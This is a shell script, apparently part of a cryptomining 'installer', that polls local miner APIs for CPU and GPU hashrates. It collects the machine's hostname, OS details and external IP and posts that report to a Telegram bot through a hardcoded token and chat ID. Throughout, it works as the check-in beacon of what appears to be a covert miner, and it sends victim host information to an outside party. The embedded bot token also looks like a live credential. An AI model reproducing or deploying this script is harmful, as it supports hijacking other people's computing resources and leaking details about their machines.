#!/bin/sh
TG_TOKEN="8556429231:AAFBKuMMfkrpnxJInSITVaBUD8prYuHcnLw"
TG_CHAT="5336452267"
ATTEMPTS_MAX=3
TIMEOUT=120
STEP=5
REPORT_DIR="$HOME/.installer"
REPORT_FILE="$REPORT_DIR/report.txt"

mkdir -p "$REPORT_DIR"

send_tg(){
  printf '{"chat_id":"%s","text":"%s"}' "$TG_CHAT" "$(echo "$1"|sed 's/"/\\"/g')" |
  curl -s -X POST "https://api.telegram.org/bot$TG_TOKEN/sendMessage" \
    -H "Content-Type: application/json; charset=utf-8" -d @- >/dev/null
}

HOST="$(hostname)"
OS="$(uname -a)"
IP="$(curl -s https://api.ipify.org)"

check_once(){
  CPU_HR=0;GPU_HR=0
  CPU_HR="$(curl -s http://127.0.0.1:16000/1/summary | grep -oE '"total":\[[0-9.]+' | grep -oE '[0-9.]+' || echo 0)"
  GPU_HR="$(curl -s http://127.0.0.1:8080/summary | grep -oE '"Performance":[ ]*[0-9.]+' | grep -oE '[0-9.]+' | awk '{printf "%.0f",$1*1000000}' || echo 0)"
}

attempt=1;EL=0
while [ $attempt -le $ATTEMPTS_MAX ]; do
  EL=0;CPU_HR=0;GPU_HR=0
  while [ $EL -lt $TIMEOUT ]; do
    check_once
    [ "$CPU_HR" != "0" ] || [ "$GPU_HR" != "0" ] && break
    sleep $STEP;EL=$((EL+STEP))
  done
  [ "$CPU_HR" != "0" ] || [ "$GPU_HR" != "0" ] && break
  attempt=$((attempt+1))
done

if [ "$CPU_HR" != "0" ] && [ "$GPU_HR" != "0" ]; then STATUS="OK"
elif [ "$CPU_HR" != "0" ] || [ "$GPU_HR" != "0" ]; then STATUS="PARTIAL"
else STATUS="FAILED"; fi

REPORT=$(cat <<EOF
INSTALLER REPORT
Platform: linux
Status: $STATUS

Host: $HOST
External IP: $IP
OS: $OS
Time: $(date)

CPU:
  detected: $( [ "$CPU_HR" != "0" ] && echo true || echo false )
  hashrate: $CPU_HR H/s

GPU:
  detected: $( [ "$GPU_HR" != "0" ] && echo true || echo false )
  hashrate: $GPU_HR H/s

Attempts: $attempt
Elapsed: ${EL}s
EOF
)

echo "$REPORT" > "$REPORT_FILE"
send_tg "$REPORT"
